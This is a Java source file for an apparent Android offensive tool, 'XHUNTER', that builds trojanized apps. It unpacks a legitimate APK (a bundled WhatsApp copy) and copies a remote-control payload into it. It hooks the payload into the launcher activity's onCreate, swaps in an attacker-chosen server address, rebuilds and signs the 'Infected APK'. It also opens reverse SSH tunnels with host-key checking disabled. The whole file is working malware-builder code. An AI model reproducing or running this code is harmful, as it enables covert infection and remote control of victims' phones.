package com.xhunter;

import android.content.res.AssetManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.android.apksigner.ApkSignerTool;

import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;
import com.facebook.react.bridge.WritableNativeArray;
import com.facebook.react.bridge.WritableNativeMap;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import net.dongliu.apk.parser.ApkFile;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.jetbrains.annotations.NotNull;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.StringReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

import brut.apktool.Main;
import brut.directory.Directory;
import brut.directory.ExtFile;

public class AppBuilderModule extends ReactContextBaseJavaModule {
    private final ReactApplicationContext reactContext;
    private final String working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
    private final String payload_name="payload.apk";
    Session session= null;
    List<String> filesListInDir = new ArrayList<String>();
    AppBuilderModule(ReactApplicationContext context) {
        super(context);
        this.reactContext = context;
    }

    @NotNull
    @Override
    public String getName() {
        return "AppBuilder";
    }
    @ReactMethod
    public void sshTunnel(String user, String host, String pass, int rport, String lhost, int lport, Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Created secure ssh tunnel successfully!");
        try{
            if(session!=null && session.isConnected()){
                promise.reject("e","[!] Ssh tunnel already connected!");
            }else {
                java.util.Properties config = new java.util.Properties();
                config.put("StrictHostKeyChecking", "no");
                JSch jsch = new JSch();
                session = jsch.getSession(user, host, 22);
                session.setPassword(pass);
                session.setConfig(config);
                session.connect();
                session.setPortForwardingR(rport, lhost, lport);
                promise.resolve(params);
            }
        } catch (SecurityException | JSchException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to create secure ssh tunnel");
        }
    }
    @ReactMethod
    public void sshTunnelDisconnect(Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Ssh tunnel disconnect!");
        try{
            if(session!=null && session.isConnected()){
                session.disconnect();
                promise.resolve(params);
            }
        } catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to stop secure ssh tunnel");
        }
    }

    @ReactMethod
    public void readDB(String path, String query, Promise promise){
        try{
            SQLiteDatabase db = SQLiteDatabase.openDatabase( path, null,0);
            Cursor res = db.rawQuery(query, null);
            res.moveToFirst();
            WritableArray list = new WritableNativeArray();
            while(res.isAfterLast() == false){
                int index=0;
                WritableMap obj = new WritableNativeMap();
                while(index<res.getColumnCount()){
                    if(res.getType(index)==4){
                        obj.putString(res.getColumnName(index), Base64.encodeToString(res.getBlob(index), Base64.DEFAULT));
                    }else{
                        obj.putString(res.getColumnName(index),res.getString(index));
                    }
                    index++;
                }
                list.pushMap(obj);
                res.moveToNext();
            }
            promise.resolve(list);
            res.close();
        } catch (SecurityException e){
            e.printStackTrace();
        }
    }
    @ReactMethod
    public void loadResources(Promise promise){
        File workingDirectory = new File(working_dir);
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Loaded Required Resources Successfully!");
        try{
            if(workingDirectory.exists()){
                copyAssets(payload_name,workingDirectory);
                copyAssets("test.pem",workingDirectory);
                copyAssets("test.pk8",workingDirectory);
                copyAssets("ip.txt",workingDirectory);
                copyAssets("WhatsApp.zip",workingDirectory);
                promise.resolve(params);
            }else{
                if(workingDirectory.mkdirs()){
                    copyAssets(payload_name,workingDirectory);
                    copyAssets("test.pem",workingDirectory);
                    copyAssets("test.pk8",workingDirectory);
                    copyAssets("ip.txt",workingDirectory);
                    copyAssets("WhatsApp.zip",workingDirectory);
                    promise.resolve(params);
                }else{
                    promise.reject("e","[!] Failed to create working directory");
                }
            }
        } catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Loading  Resources Failed!");
        }
    }
    @ReactMethod
    public void unzip( Promise promise) throws IOException {
        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(working_dir+"WhatsApp.zip")));
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Unziped Resources Successfully!");
        try {
            ZipEntry ze;
            int count;
            byte[] buffer = new byte[8192];
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(working_dir+"normal_apk", ze.getName());
                File dir = ze.isDirectory() ? file : file.getParentFile();
                if (!dir.isDirectory() && !dir.mkdirs())
                    throw new FileNotFoundException("Failed to ensure directory: " +
                            dir.getAbsolutePath());
                if (ze.isDirectory())
                    continue;
                FileOutputStream fout = new FileOutputStream(file);
                try {
                    while ((count = zis.read(buffer)) != -1)
                        fout.write(buffer, 0, count);
                } finally {
                    fout.close();
                }
            }
        }catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Unziping  Resources Failed!");
        }
        finally {
            zis.close();
            promise.resolve(params);
        }
    }
    @ReactMethod
    public void edit_app(String ip, Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Injected malicious code Successfully!");
        String fileName = working_dir+"ip.txt";
        File file = new File(fileName);
        FileReader fr = null;
        String line;
        try {
            fr = new FileReader(file);
            BufferedReader br = new BufferedReader(fr);
            if(new File(working_dir+"normal_apk/assets").exists()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                while((line=br.readLine()) != null){
                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
                }//loop
                fw.close();
                promise.resolve(params);
            }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                while((line=br.readLine()) != null){
                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
                }//loop
                fw.close();
                promise.resolve(params);
            }else{
                promise.reject("e","[!] Injecting malicious code Failed! Due to assets");
            }

        } catch ( IOException e) {
            e.printStackTrace();
            promise.reject("e","[!] Injecting malicious code Failed!");
        }
    }
    @ReactMethod
    public void zip(Promise promise) {
        File dir = new File(working_dir+"normal_apk");
        String zipDirName = working_dir+"unsigned.apk";
        zipDirectory(dir, zipDirName,promise);
    }
    @ReactMethod
    public void decompile_payload(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Decompiled Xhunter Payload Successfully !");
        try {
            Main.main(new String[]{"d","-r","-f", working_dir+"payload.apk", "-o", working_dir+"payload", });
            promise.resolve(params);
        } catch (Exception e) {
            promise.reject("e","[!] Failed to Decompile Xhunter Payload APK");
            e.printStackTrace();
        }
    }
    @ReactMethod
    public void decompile_normal_apk(String targetApkPath, Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Decompiled Successfully !");
        try {
            Main.main(new String[]{"d", "-r","-f", targetApkPath , "-o", working_dir+"normal_apk", });
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Decompile Normal/Legitimate APK");
        }
    }
    @ReactMethod
    public void move_payload_files_to_normal_apk(Promise promise){
        String source1 = working_dir+"payload/smali/com/xhunter";
        String destination1 = working_dir+"normal_apk/smali/com/xhunter";
        String source2 = working_dir+"payload/smali/io";
        String destination2 = working_dir+"normal_apk/smali/io";
        String source3 = working_dir+"payload/smali/okhttp3";
        String destination3 = working_dir+"normal_apk/smali/okhttp3";
        String source4 = working_dir+"payload/smali/okio";
        String destination4 = working_dir+"normal_apk/smali/okio";

        String source5 = working_dir+"payload/unknown/okhttp3";
        String destination5 = working_dir+"normal_apk/unknown/okhttp3";

        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Moved Successfully !");
        try {
            moveDir(source1,destination1);// xhunter payload
            moveSocketIO(source2,destination2);// socket-io
            moveDir(source3,destination3);// okhttp3
            moveDir(source4,destination4);// okio
            moveUnknown(source5,destination5);// unknown
            promise.resolve(params);
        } catch (IOException e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Move Xhunter Payload Files to Normal/Legitimate APK");
        }
    }
    @ReactMethod
    public void hook_smali_file(String targetApkPath, Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Hooked Successfully !");
        try (ApkFile apkFile = new ApkFile(new File(targetApkPath))) {
            String manifestXml = apkFile.getManifestXml();
            String smali_hook_path = getHookSmaliPath(manifestXml);
            if(smali_hook_path != null) {
                hook_payload(working_dir+"normal_apk/smali/"+smali_hook_path);
                promise.resolve(params);
            }else{
                promise.reject("e","[!] Unable to locate the .smali launcher in AndroidManifest.xml");
            }
        }catch(IOException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to Hook Xhunter Payload");
        }
    }
    @ReactMethod
    public void compile_build(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Compiled Infected APK Successfully !");
        try {
            Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Compile Infected APK");
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @ReactMethod
    public void sign(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Signed Infected APK !");
        try {
            ApkSignerTool.main(new String[]{"sign", "--key", working_dir+"test.pk8", "--cert", working_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Sign Infected APK");
        }
    }
    @ReactMethod
    public void cleanup(Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Done !!");
        try {
            deleteFolder(working_dir+"normal_apk");
            deleteFolder(working_dir+"payload");
            deleteFile(working_dir+payload_name);
            deleteFile(working_dir+"WhatsApp.zip");
            deleteFile(working_dir+"unsigned.apk");
            deleteFile(working_dir+"ip.txt");
            deleteFile(working_dir+"test.pk8");
            deleteFile(working_dir+"test.pem");
            promise.resolve(params);
        }catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to clean unnecessary files, But it's okay");
        }
    }


    private String getHookSmaliPath(String manifestXml) {
        String hook_smali_path=null;
        try{
            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput( new StringReader( manifestXml ) );
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if(eventType == XmlPullParser.START_TAG) {
                   if(xpp.getName().equals("activity")){
                       int i=0;
                       String smali_path="";
                       while (i<xpp.getAttributeCount()) {
                           if (xpp.getAttributeName(i).equals("name")) {
                               smali_path=xpp.getAttributeValue(i);
                           }
                           i++;
                       }
                       while (eventType != XmlPullParser.END_TAG) {
                            xpp.next();
                           if ((xpp.getName() != null) && (xpp.getEventType() != XmlPullParser.END_TAG) && (xpp.getName().equals("action"))) {
                               System.out.println("Action ------> " + xpp.getAttributeValue(0));
                               if (xpp.getAttributeValue(0).equals("android.intent.action.MAIN")) {
                                   Log.e("Found smali path :", smali_path);
                                   hook_smali_path = smali_path.replaceAll("\\.","/")+".smali";
                               }
                           }//action
                           if ((xpp.getName() != null) && (xpp.getName().equals("activity"))) {
                              break;
                           }
                       }//iterating through a Activity for all its elements like <intent-filter/> <action/>
                   }//if current element is actitvity then true
                }
                eventType = xpp.next();
            }
        }catch (XmlPullParserException | IOException e){
            e.printStackTrace();
        }
        return hook_smali_path;
    }
    private void hook_payload(String path){
        try
        {
            File file=new File(path);    //creates a new file instance
            FileReader fr=new FileReader(file);   //reads the file
            BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream
            StringBuilder sb=new StringBuilder();    //constructs a string buffer with no characters
            String line;
            Pattern pattern = Pattern.compile(";->onCreate\\(Landroid/os/Bundle;\\)V");
            while((line=br.readLine())!=null)
            {
                sb.append(line);      //appends line to string buffer
                sb.append("\n");     //line feed
                boolean matchFound = pattern.matcher(line).find();
                if(matchFound){
                    sb.append("invoke-static {p0}, Lcom/xhunter/client/Payload;->start(Landroid/content/Context;)V");
                    sb.append("\n");
                }
            }
            fr.close();    //closes the stream and release the resources
            FileOutputStream fileOut = new FileOutputStream(path); //writes file
            fileOut.write(sb.toString().getBytes());
            fileOut.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }
    private void copyAssets(String file,File targetDirectory) {
        AssetManager assetManager = getReactApplicationContext().getAssets();
        if (file != null){
            InputStream in = null;
            OutputStream out = null;
            try {
                in = assetManager.open(file);
                File outFile = new File(targetDirectory, file);
                out = new FileOutputStream(outFile);
                copyFile(in, out);
            } catch(IOException e) {
                Log.e("tag", "Failed to copy asset file: " + file, e);
            }
            finally {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException e) {
                        // NOOP
                    }
                }
                if (out != null) {
                    try {
                        out.close();
                    } catch (IOException e) {
                        // NOOP
                    }
                }
            }
        }
    }
    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
            out.write(buffer, 0, read);
        }
    }
    private void deleteFile(String path){
        File file = new File(path);
        if (file.exists()) {
            try {
                if(file.delete()){
                    System.out.println("success");
                }
            } catch (SecurityException e){
                e.printStackTrace();
            }
        }
    }
    private void deleteFolder(String path){
        File dir = new File(path);
        if (dir.exists()) {
            String deleteCmd = "rm -r " + path;
            Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(deleteCmd);
            } catch (IOException e) { }
        }
    }
    private void moveDir(String source, String destination) throws IOException{
            if(!(new File(destination).exists())){
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
    }
    private void moveSocketIO(String source, String destination) throws IOException{
        if(!new File(working_dir+"normal_apk/smali/io/socket").exists()) {
            if (!new File(working_dir+"normal_apk/smali/io").exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }else{
                FileUtils.moveDirectory(new File(source+"/socket"), new File(destination+"/socket"));
            }
        }//then do nothing
    }
    private void moveUnknown(String source, String destination) throws IOException{
        if(new File(working_dir+"normal_apk/unknown").exists()) {
            if (!new File(destination).exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }else{
            if(new File(working_dir+"normal_apk/unknown").mkdir()){
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }
    }
    private void zipDirectory(File dir, String zipDirName,Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Ziped Resources Successfully!");
        try {
            populateFilesList(dir);
            //now zip files one by one
            //create ZipOutputStream to write to the zip file
            FileOutputStream fos = new FileOutputStream(zipDirName);
            ZipOutputStream zos = new ZipOutputStream(fos);
            for(String filePath : filesListInDir){
                //for ZipEntry we need to keep only relative file path, so we used substring on absolute path
                ZipEntry ze = new ZipEntry(filePath.substring(dir.getAbsolutePath().length()+1, filePath.length()));
                zos.putNextEntry(ze);
                //read the file and write to ZipOutputStream
                FileInputStream fis = new FileInputStream(filePath);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                zos.closeEntry();
                fis.close();
            }
            zos.close();
            fos.close();
            promise.resolve(params);
        } catch (IOException e) {
            e.printStackTrace();
            promise.reject("e","[!] Ziping  Resources Failed!");
        }
    }
    private void populateFilesList(File dir) throws IOException {
        File[] files = dir.listFiles();
        for(File file : files){
            if(file.isFile()) filesListInDir.add(file.getAbsolutePath());
            else populateFilesList(file);
        }
    }
    private File getAaptFile() throws IOException {
        copyAssets(reactContext.getAssets(), "sdk", reactContext.getFilesDir());
        copyAssets(reactContext.getAssets(), "bin", reactContext.getFilesDir());
        File[] binFiles = new File(reactContext.getFilesDir(), "bin").listFiles();
        for (File binFile : binFiles) {
            binFile.setExecutable(true, true);
        }
        String arch = Build.CPU_ABI.substring(0, 3).toLowerCase(Locale.US);
        String aaptName;
        boolean usePie = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN;
        switch (arch) {
            case "x86":
                if (usePie) {
                    aaptName = "aapt-x86-pie";
                } else {
                    aaptName = "aapt-x86";
                }
                break;
            case "arm":
            default:
                // Default to ARM, just in case
                if (usePie) {
                    aaptName = "aapt-arm-pie";
                } else {
                    aaptName = "aapt-arm";
                }
                break;
        }
        return new File(reactContext.getFilesDir(), "bin/"+aaptName);
    }
    public static void copyAssets(AssetManager assets, String assetPath, File destFolder) throws IOException {
        String[] childs = assets.list(assetPath);
        if (childs.length == 0) {
            copyFile(assets, assetPath, destFolder);
        } else {
            copyFolder(assets, assetPath, destFolder);
        }
    }
    private static void copyFolder(AssetManager assets, String assetPath, File destFolder) throws IOException {
        Log.d("XHUNTER", "copyFolder() called with: assets = [" + assets + "], assetPath = [" + assetPath + "], destFolder = [" + destFolder + "]");
        String[] names = assets.list(assetPath);
        for (String name : names) {
            copyAssets(assets, assetPath + "/" + name, destFolder);
        }
    }
    private static void copyFile(AssetManager assets, String assetPath, File destFolder) throws IOException {
        Log.d("XHUNTER", "copyFile() called with: assets = [" + assets + "], assetPath = [" + assetPath + "], destFolder = [" + destFolder + "]");
        File outFile = new File(destFolder, assetPath);
        outFile.getParentFile().mkdirs();
        InputStream input = assets.open(assetPath);
        OutputStream output = new FileOutputStream(outFile);
        IOUtils.copy(input, output);
        input.close();
        output.close();
    }
    public static File getClasspathFile(ReactContext context) {
        return new File(context.getFilesDir(),"sdk/platforms/android-27/android.jar");
    }
}
